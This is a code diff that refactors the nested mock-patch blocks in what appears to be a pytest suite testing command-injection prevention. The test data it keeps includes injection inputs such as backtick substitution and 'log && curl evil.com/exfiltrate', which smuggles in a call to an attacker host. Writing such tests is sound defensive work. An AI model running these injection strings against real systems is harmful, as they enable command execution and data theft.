@@ -188,19 +188,21 @@ class TestCommandInjectionPrevention:
             ["find", "$TMPDIR", "-name", "`whoami`.txt"],
         ]
 
-        with patch("subprocess.run") as mock_run:
-            with patch("subprocess.Popen") as mock_popen:
-                for cmd_args in dangerous_commands:
-                    # Test that dangerous arguments are rejected or sanitized
-                    # The actual implementation should validate all subprocess arguments
+        with (
+            patch("subprocess.run") as mock_run,
+            patch("subprocess.Popen") as mock_popen,
+        ):
+            for cmd_args in dangerous_commands:
+                # Test that dangerous arguments are rejected or sanitized
+                # The actual implementation should validate all subprocess arguments
 
-                    # Verify that shell=True is never used with user input
-                    if any(
-                        char in " ".join(cmd_args) for char in [";", "|", "&", "`", "$"]
-                    ):
-                        # Should not execute dangerous commands
-                        mock_run.assert_not_called()
-                        mock_popen.assert_not_called()
+                # Verify that shell=True is never used with user input
+                if any(
+                    char in " ".join(cmd_args) for char in [";", "|", "&", "`", "$"]
+                ):
+                    # Should not execute dangerous commands
+                    mock_run.assert_not_called()
+                    mock_popen.assert_not_called()
 
     @pytest.mark.asyncio
     async def test_shell_execution_prevention(self):
@@ -211,19 +213,21 @@ class TestCommandInjectionPrevention:
             "log && curl evil.com/exfiltrate",
         ]
 
-        with patch("os.system") as mock_system:
-            with patch("subprocess.call") as mock_call:
-                for _user_input in _user_inputs:
-                    # Should never call os.system or subprocess with shell=True and user input
-                    mock_system.assert_not_called()
+        with (
+            patch("os.system") as mock_system,
+            patch("subprocess.call") as mock_call,
+        ):
+            for _user_input in _user_inputs:
+                # Should never call os.system or subprocess with shell=True and user input
+                mock_system.assert_not_called()
 
-                    # If subprocess is used, should use argument list, not shell string
-                    if mock_call.called:
-                        # Verify shell=False or argument list usage
-                        call_args = mock_call.call_args
-                        if call_args:
-                            # Should not pass user input directly to shell
-                            assert _user_input not in str(call_args)
+                # If subprocess is used, should use argument list, not shell string
+                if mock_call.called:
+                    # Verify shell=False or argument list usage
+                    call_args = mock_call.call_args
+                    if call_args:
+                        # Should not pass user input directly to shell
+                        assert _user_input not in str(call_args)
 
     @pytest.mark.asyncio
     async def test_environment_variable_injection_prevention(self):
